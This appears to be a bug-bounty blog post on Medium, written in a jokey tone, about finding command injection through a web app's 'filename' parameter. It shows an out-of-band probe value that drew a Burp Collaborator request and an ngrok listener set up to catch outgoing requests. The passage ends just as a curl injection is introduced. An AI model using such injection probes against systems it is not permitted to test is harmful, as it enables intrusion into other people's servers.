# :game_die: Medium

---

# When Life Throws Errors, I Throw Commands: My Command Injection Bug🤓

Hey there..! 👋

Free Link🎈

I wake up every day hoping to fix my life, but instead, I end up fixing someone else’s web app vulnerabilities. 😅

After a tragic attempt at making breakfast, how my boring day turned into a hacking rollercoaster! 🎢

## 🕵️ The Discovery: Filename or Commandline?

I was casually testing a web app when I stumbled upon a parameter named **filename**. Out of curiosity (and because I had nothing better to do), I entered this:

```
filename=burp.com
```

Guess what? I received an **SMTP request** from my Burp Collaborator server! 💥

At that moment, my brain went:

>

*“Hold on… is this thing vulnerable to Command Injection?!”*

Spoiler alert: It was.

- **“I can’t control my life, but I can control servers with **`**curl**`**."**

## 🔑 The Exploitation: Curling My Way to Victory

I quickly spun up an **ngrok server** to catch outgoing requests:

```
./ngrok http 80
```

Then, I tried injecting a **curl command** into the vulnerable parameter:

---
